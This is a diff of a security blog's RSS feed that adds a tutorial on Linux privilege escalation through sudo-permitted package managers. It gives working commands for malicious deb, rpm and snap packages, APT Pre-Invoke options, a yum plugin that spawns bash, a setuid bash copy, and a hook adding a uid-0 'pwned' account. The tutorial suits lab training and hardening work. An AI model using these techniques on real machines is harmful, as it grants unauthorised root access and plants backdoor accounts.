@@ -1,4 +1,279 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ikuamike</title><link>https://blog.ikuamike.io/posts/</link><description>Recent content in Posts on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Thu, 08 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Netcat - All you need to know</title><link>https://blog.ikuamike.io/posts/2021/netcat/</link><pubDate>Thu, 08 Jul 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/netcat/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/netcat/netcat.png" class="center" style="border-radius: 8px;" />
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on ikuamike</title><link>https://blog.ikuamike.io/posts/</link><description>Recent content in Posts on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Sun, 08 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Privilege Escalation - Package Managers</title><link>https://blog.ikuamike.io/posts/2021/package_managers_privesc/</link><pubDate>Sun, 08 Aug 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/package_managers_privesc/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/package.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>Package managers are run with root permissions on linux distributions to install,
+update or remove software/packages. In certain cases the user should not be a root/admin user but
+has been assigned sudo permissions to run the package manager only for package management
+purposes.&lt;/p>
+&lt;p>We&amp;rsquo;ll look at how this permission can be abused to gain root access to the machine via a root shell.&lt;/p>
+&lt;p>If you would like to test out these commands in a lab environment without the need to install and setup your own machine have a look
+at my scenario on &lt;a href="https://app.cyberranges.com" target="_blank" rel="noopener">&lt;strong>CYBERRANGES&lt;/strong>&lt;/a>
+using the link below.&lt;/p>
+&lt;p>&lt;a href="https://app.cyberranges.com/scenario/610d49c873fe0c0007a989f7" target="_blank" rel="noopener">Linux Privilege Escalation: Package Managers Scenario&lt;/a>
+&lt;/p>
+&lt;h2 id="package-managers">Package Managers&lt;/h2>
+&lt;p>For debian based linux distributions we have several package managers:&lt;/p>
+&lt;ul>
+&lt;li>apt/apt-get&lt;/li>
+&lt;li>dpkg&lt;/li>
+&lt;li>aptitude&lt;/li>
+&lt;li>synaptic&lt;/li>
+&lt;/ul>
+&lt;p>From the list APT (Advanced Packaging Tool) is the most common one that is used. Synaptic
+is a GUI application that supports similar features to the command line ones. Packages
+are usually in .deb files.&lt;/p>
+&lt;p>For redhat based distributions we have:&lt;/p>
+&lt;ul>
+&lt;li>yum (Yellowdog Updater, Modified)&lt;/li>
+&lt;li>rpm&lt;/li>
+&lt;li>dnf&lt;/li>
+&lt;/ul>
+&lt;p>Packages are usually .rpm files.&lt;/p>
+&lt;p>There&amp;rsquo;s another package manager called &lt;code>snap&lt;/code> that supports all major linux distros. Therefore,
+for our case it works on both debian and redhat based distros.&lt;/p>
+&lt;p>In this tutorial we&amp;rsquo;re taking the position of a low privileged user that only has permission to run one of the
+above package managers as sudo.&lt;/p>
+&lt;h2 id="exploitation-deb">Exploitation: DEB&lt;/h2>
+&lt;p>Here I have an ubuntu server, the user has the permission to run &lt;code>apt&lt;/code> with sudo.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-1.png" class="center" style="border-radius: 8px;" />
+&lt;h3 id="method-1-creating-a-malicious-debian-package">Method 1: Creating a malicious debian package&lt;/h3>
+&lt;p>The low privileged user can create a debian package that contains commands to escalate the privileges.&lt;/p>
+&lt;p>To start off we&amp;rsquo;ll create a directory called &lt;code>exploit&lt;/code> then create a shell script that runs &lt;code>whoami&lt;/code> command and put in the folder.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir exploit
+echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
+echo whoami &amp;gt;&amp;gt; exploit/exploit.sh
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-2.png" class="center" style="border-radius: 8px;" />
+&lt;p>With that ready we&amp;rsquo;ll use a tool called fpm (Effing package management) to build a debian package that will execute
+the script we have just created.&lt;/p>
+&lt;p>To create the debian package we&amp;rsquo;ll run the below fpm command:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t deb --before-install ./exploit/exploit.sh ./exploit
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-3.png" class="center" style="border-radius: 8px;" />
+&lt;p>Next we install the package via apt using the below command:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt install ./exploit_1.0_amd64.deb
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-4.png" class="center" style="border-radius: 8px;" />
+&lt;p>There we see the command gets executed as root, now we can run any command as root. From there you can use different
+strategies to get a root shell like adding ssh keys to the root user or getting a reverse shell.&lt;/p>
+&lt;p>For our case here, we&amp;rsquo;ll just change the &lt;code>whoami&lt;/code> command to &lt;code>bash&lt;/code> in the exploit.sh script then create a new
+debian package. But this time specify a new version to upgrade the existing one that we installed.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t deb -v 1.1 --before-install ./exploit/exploit.sh ./exploit
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-5.png" class="center" style="border-radius: 8px;" />
+&lt;p>We&amp;rsquo;ve successfully got an interactive shell as root. This also applies to apt-get and dpkg.&lt;/p>
+&lt;h3 id="method-2-apt-configuration-options">Method 2: APT Configuration Options&lt;/h3>
+&lt;p>APT is a high-level command line interface for the package management system. This means it serves a front end interface for the
+more low level &lt;code>dpkg&lt;/code> package manager.&lt;/p>
+&lt;p>When apt calls dpkg you can specify shell commands to run before (Pre-Invoke) or after (Post-Invoke) the invokation happens.&lt;/p>
+&lt;p>The above can be configured using configuration files. These configuration files are stored in /etc/apt/apt.conf.d. However,
+in the case where you are trying to escalate privileges the low privileged user may not have the permissions to create files
+in that directory.&lt;/p>
+&lt;p>APT supports specifying this configurations on the commandline as well by using the &lt;code>-o&lt;/code> option. Using this we can run the following
+commands to get a root shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt update -o APT::Update::Pre-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-6.png" class="center" style="border-radius: 8px;" />
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt update -o APT::Update::Post-Invoke::&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-7.png" class="center" style="border-radius: 8px;" />
+&lt;p>Since apt interacts with dpkg we can also use dpkg like configurations to get a root shell but a bit differently.
+We can&amp;rsquo;t pass dpkg configurations directly to apt&amp;rsquo;s commandline options therefore we need to use a configuration file.&lt;/p>
+&lt;p>APT allows us to specify a configuration file to use in addition to the default configuration via command line option &lt;code>-c&lt;/code>.&lt;/p>
+&lt;p>Let&amp;rsquo;s create a malicious config file and use it.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">echo &lt;span style="color:#e6db74">&amp;#39;Dpkg::Pre-Invoke {&amp;#34;/bin/bash&amp;#34;}&amp;#39;&lt;/span> &amp;gt; badconfig
+sudo apt install -c badconfig netcat
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-8.png" class="center" style="border-radius: 8px;" />
+&lt;p>For the above to work the package you choose should not be presently installed on the system.&lt;/p>
+&lt;p>The techniques here also work with apt-get.&lt;/p>
+&lt;h3 id="method-3-invoking-the-default-pager">Method 3: Invoking the default pager&lt;/h3>
+&lt;p>When viewing changelog, apt/apt-get will display it using sensible-pager which is usually set to &lt;code>less&lt;/code> by default. This means that apt
+will run less and because less will also be running as root we can get a root shell from it.&lt;/p>
+&lt;p>Run the first command then when in the pager interface, run the second command. This also works with apt-get.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo apt changelog apt
+!/bin/bash
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation-rpm">Exploitation: RPM&lt;/h2>
+&lt;p>Here I have a centos 7 server. Similar to above section we start with a low privileged user that can run &lt;code>yum&lt;/code> as sudo.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-9.png" class="center" style="border-radius: 8px;" />
+&lt;h3 id="method-1-creating-a-malicious-rpm-package">Method 1: Creating a malicious rpm package&lt;/h3>
+&lt;p>Using the same technique as earlier we&amp;rsquo;ll create a malicious rpm package using fpm. We&amp;rsquo;ll use the ubuntu machine to create the
+package then transfer it to the centos server.&lt;/p>
+&lt;p>In this case dropping into a shell doesn&amp;rsquo;t work, we therefore need to run a command that will give us shell access differently. I will create an
+suid bash binary that will give us root access.&lt;/p>
+&lt;p>We&amp;rsquo;ll create the exploit folder and exploit.sh script inside of /tmp. Then put the below command in the script.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd /tmp
+mkdir exploit
+echo &lt;span style="color:#e6db74">&amp;#39;#!/bin/bash&amp;#39;&lt;/span> &amp;gt; exploit/exploit.sh
+echo &lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
+echo &lt;span style="color:#e6db74">&amp;#39;chmod +xs /tmp/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt; exploit/exploit.sh
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-10.png" class="center" style="border-radius: 8px;" />
+&lt;p>Now we&amp;rsquo;ll create the malicious rpm package using a similar command to the debian package.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t rpm --before-install ./exploit/exploit.sh ./exploit
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-11.png" class="center" style="border-radius: 8px;" />
+&lt;p>Then we can transfer it to the centos server by launching a python http server and downloading it.&lt;/p>
+&lt;p>on ubuntu server:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">python3 -m http.server
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>on centos server:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget http://192.168.125.10:8000/exploit-1.0-1.x86_64.rpm
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once successfully downloaded we will install the package and the included script will be executed to create our
+suid bash binary.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo yum localinstall -y exploit-1.0-1.x86_64.rpm
+/tmp/bash -p
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-12.png" class="center" style="border-radius: 8px;" />
+&lt;p>We have successfully gained a root shell.&lt;/p>
+&lt;h3 id="method-2-loading-a-custom-yum-plugin">Method 2: Loading a custom yum plugin&lt;/h3>
+&lt;p>Yum provides plugins that extend and enhance its operations. Certain plugins are installed by default.
+Yum always informs you which plugins, if any, are loaded and active whenever you call any yum command.&lt;/p>
+&lt;p>As shown below, when we run the yum update command we can see the loaded plugin.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-17.png" class="center" style="border-radius: 8px;" />
+&lt;p>From yum man page:&lt;/p>
+&lt;p>A plugin is a Python &amp;ldquo;.py&amp;rdquo; file which is installed in one of the directories specified by the &lt;code>pluginpath&lt;/code> option in yum.conf.&lt;/p>
+&lt;p>For a plugin to work, the following conditions must be met:&lt;/p>
+&lt;pre>&lt;code>1. The plugin module file must be installed in the plugin path as just described.
+2. The global plugins option in /etc/yum.conf must be set to '1'.
+3. A configuration file for the plugin must exist in
+/etc/yum/pluginconf.d/&amp;lt;plugin_name&amp;gt;.conf and the enabled setting in this file
+must set to '1'. The minimal content for such a configuration file is:
+[main]
+enabled = 1
+&lt;/code>&lt;/pre>
+&lt;p>From yum.conf man page, there are several plugin configurations that can be set:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>plugins&lt;/strong>&lt;/p>
+&lt;p>Either &lt;code>0&lt;/code> or &lt;code>1&lt;/code>. Global switch to enable or disable yum plugins. Default is &lt;code>0&lt;/code> (plugins disabled). See the PLUGINS section of the yum(8) man for more information on installing yum plugins.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>pluginpath&lt;/strong>&lt;/p>
+&lt;p>A list of directories where yum should look for plugin modules. Default is &lt;code>/usr/share/yum-plugins&lt;/code> and &lt;code>/usr/lib/yum-plugins&lt;/code>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>pluginconfpath&lt;/strong>&lt;/p>
+&lt;p>A list of directories where yum should look for plugin configuration files. Default is &lt;code>/etc/yum/pluginconf.d&lt;/code>.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>Using this information we can look at yum.conf on our centos server.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-18.png" class="center" style="border-radius: 8px;" />
+&lt;p>We see that plugins are currently enabled, but there&amp;rsquo;s not entry for the other options meaning the default options apply.&lt;/p>
+&lt;p>We can confirm this by seeing the fastestmirror plugin file and configuration.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-19.png" class="center" style="border-radius: 8px;" />
+&lt;p>Now we are ready to perform the exploit. Since as a low privileged user we cannot write the default plugin directories, we need to use a
+configuration file that specifies directories we have permission to write.&lt;/p>
+&lt;p>Fortunately, yum allows us to specify a configuration file via the commandline via the &lt;code>-c&lt;/code> option. Let&amp;rsquo;s create a configuration
+file called &lt;code>custom_yum.conf&lt;/code> with the below contents.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd /tmp
+cat &amp;gt;custom_yum.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;span style="color:#e6db74">[main]
+&lt;/span>&lt;span style="color:#e6db74">plugins=1
+&lt;/span>&lt;span style="color:#e6db74">pluginpath=/tmp/badplugin
+&lt;/span>&lt;span style="color:#e6db74">pluginconfpath=/tmp/badplugin
+&lt;/span>&lt;span style="color:#e6db74">EOF&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next let&amp;rsquo;s create the plugin configuration file, but put it in the badplugin folder.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir badplugin
+cat &amp;gt;badplugin/badplugin.conf&lt;span style="color:#e6db74">&amp;lt;&amp;lt;EOF
+&lt;/span>&lt;span style="color:#e6db74">[main]
+&lt;/span>&lt;span style="color:#e6db74">enabled=1
+&lt;/span>&lt;span style="color:#e6db74">EOF&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then create the plugin itself.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">cat &lt;span style="color:#f92672">&amp;gt;&lt;/span>badplugin&lt;span style="color:#f92672">/&lt;/span>badplugin&lt;span style="color:#f92672">.&lt;/span>py&lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span>EOF
+&lt;span style="color:#f92672">import&lt;/span> os
+&lt;span style="color:#f92672">from&lt;/span> yum.plugins &lt;span style="color:#f92672">import&lt;/span> PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE, API_VERSION
+requires_api_version&lt;span style="color:#f92672">=&lt;/span>API_VERSION
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">init_hook&lt;/span>(conduit):
+os&lt;span style="color:#f92672">.&lt;/span>execl(&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;/bin/bash&amp;#39;&lt;/span>)
+EOF
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we can execute the plugin with the below command and get a root shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo yum -c custom_yum.conf
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-20.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="exploitation-snap">Exploitation: Snap&lt;/h2>
+&lt;p>As snap works on all major distros, I&amp;rsquo;ll be showcasing this on our ubuntu server. The low privileged user has the
+ability to run snap with sudo permissions.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-16.png" class="center" style="border-radius: 8px;" />
+&lt;h3 id="creating-a-malicious-snap-package">Creating a malicious snap package&lt;/h3>
+&lt;p>Creation of a malicious snap package can be achieved in 2 ways, using the fpm command which we&amp;rsquo;ve already used and using snapcraft.&lt;/p>
+&lt;p>The idea behind the creation of the package is the same, when creating a snap package you can specify hooks.&lt;/p>
+&lt;p>According to the documentation:&lt;/p>
+&lt;blockquote>
+&lt;p>A hook is an executable file that runs within a snap’s confined environment when a certain action occurs.&lt;/p>
+&lt;/blockquote>
+&lt;p>One of the hooks that is supported by snap is called &lt;code>install&lt;/code> hook.&lt;/p>
+&lt;p>According to the documentation:&lt;/p>
+&lt;blockquote>
+&lt;p>The &lt;code>install&lt;/code> hook is called upon initial install only, i.e. it’s not called on subsequent refreshes.&lt;/p>
+&lt;p>The hook is executed before starting snap services (if it has any) and before the configure hook. The install hook is the place for one-time
+actions, such as an early initialisation of a resource when installed for the first time.&lt;/p>
+&lt;/blockquote>
+&lt;p>We can create this &lt;code>install&lt;/code> hook as a shell script that will execute our malicious command when we try to
+install the package.&lt;/p>
+&lt;h4 id="1-snapcraft">1. Snapcraft&lt;/h4>
+&lt;p>Let&amp;rsquo;s setup our environment.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">mkdir exploit
+cd exploit
+snapcraft init
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The snapcraft init command create a &lt;code>snap&lt;/code> directory and the file &lt;code>snapcraft.yaml&lt;/code> inside it.&lt;/p>
+&lt;p>Next change into the snap directory then create a &lt;code>hooks&lt;/code> directory and &lt;code>install&lt;/code> file inside.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cd snap
+mkdir hooks
+touch hooks/install
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we will put our malicious commands in the install file and make it and executable bash script.&lt;/p>
+&lt;p>Since our goal is to obtain a root shell, we will use another technique of adding a new user with uid 0 to give us
+root privileges. You can also use a reverse shell commmand.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>/usr/sbin/useradd -p &lt;span style="color:#66d9ef">$(&lt;/span>openssl passwd -1 password123&lt;span style="color:#66d9ef">)&lt;/span> -u &lt;span style="color:#ae81ff">0&lt;/span> -o -s /bin/bash -m pwned
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Don&amp;rsquo;t forget to make the script executable.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">chmod +x hooks/install
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s edit the snapcraft.yaml file, we&amp;rsquo;ll change the default name, summary and description and also delete the base entry.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="color:#f92672">name&lt;/span>: &lt;span style="color:#ae81ff">exploit&lt;/span> &lt;span style="color:#75715e"># you probably want to &amp;#39;snapcraft register &amp;lt;name&amp;gt;&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">version&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;0.1&amp;#39;&lt;/span> &lt;span style="color:#75715e"># just for humans, typically &amp;#39;1.2+git&amp;#39; or &amp;#39;1.3.2&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">summary&lt;/span>: &lt;span style="color:#ae81ff">privesc exploit&lt;/span>
+&lt;span style="color:#f92672">description&lt;/span>: |&lt;span style="color:#e6db74">
+&lt;/span>&lt;span style="color:#e6db74"> privesc exploit
+&lt;/span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;span style="color:#e6db74"> grade: devel # must be &amp;#39;stable&amp;#39; to release into candidate/stable channels
+&lt;/span>&lt;span style="color:#e6db74"> confinement: devmode # use &amp;#39;strict&amp;#39; once you have the right plugs and slots
+&lt;/span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;span style="color:#e6db74"> parts:
+&lt;/span>&lt;span style="color:#e6db74"> my-part:
+&lt;/span>&lt;span style="color:#e6db74"> # See &amp;#39;snapcraft plugins&amp;#39;&lt;/span>
+&lt;span style="color:#f92672">plugin&lt;/span>: &lt;span style="color:#ae81ff">nil&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s move back into the &lt;code>exploit&lt;/code> directory and then run &lt;code>snapcraft&lt;/code> command to create the package then install it.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo snap install --dangerous --devmode exploit_0.1_amd64.snap
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once installed we see our user has been added and we can switch user and get the root shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-13.png" class="center" style="border-radius: 8px;" />
+&lt;h4 id="2-fpm">2. fpm&lt;/h4>
+&lt;p>Using fpm we&amp;rsquo;ll use the exact same file structure but change the &lt;code>snap&lt;/code> directory name to &lt;code>meta&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">fpm -n exploit -s dir -t snap -a all meta
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-14.png" class="center" style="border-radius: 8px;" />
+&lt;p>When we install it we see that our new user has been added and we can obtain a root shell by switching to that user,
+same way as earlier.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/package_manager_privesc/privesc-15.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>As we have seen there are many techniques to escalate privileges via package managers which would make hardening this permission not the easiest
+task. Therefore, only provide this permission with these risks in mind.&lt;/p>
+&lt;p>Althrough out this tutorial the fpm package has been very useful, it&amp;rsquo;s a really nice tool to quickly create packages for our use case.
+It can be installed on any of the distros but I encountered issues installing it on centos, therefore I skipped it.&lt;/p>
+&lt;p>Althrough out this tutorial the fpm package has been useful, it&amp;rsquo;s a really nice tool to quickly create packages for our use case.&lt;/p>
+&lt;p>It can be installed on any of the distros but I encountered issues installing it on centos, therefore I skipped it.&lt;/p>
+&lt;p>There are some techniques I haven&amp;rsquo;t fully explored like using &lt;strong>rpm&lt;/strong>, feel free to try this out on the provided cyberranges lab.&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">https://github.com/jordansissel/fpm/
+http://manpages.ubuntu.com/manpages/focal/en/man8/apt.8.html
+http://manpages.ubuntu.com/manpages/focal/man5/apt.conf.5.html
+https://gtfobins.github.io/gtfobins/apt/
+https://gtfobins.github.io/gtfobins/yum/
+https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins
+http://yum.baseurl.org/wiki/WritingYumPlugins.html
+https://www.tecmint.com/enable-disable-and-install-yum-plug-ins/
+https://gtfobins.github.io/gtfobins/snap/
+https://snapcraft.io/docs/supported-snap-hooks
+https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html
+https://youtu.be/8ikdbyOQsLg
+&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>Netcat - All you need to know</title><link>https://blog.ikuamike.io/posts/2021/netcat/</link><pubDate>Thu, 08 Jul 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/netcat/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/netcat/netcat.png" class="center" style="border-radius: 8px;" />
 &lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;p>Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. Netcat has been referred to as the TCP/IP / networking swiss army knife.
 In this article we&amp;rsquo;ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc&amp;hellip;&lt;/p>
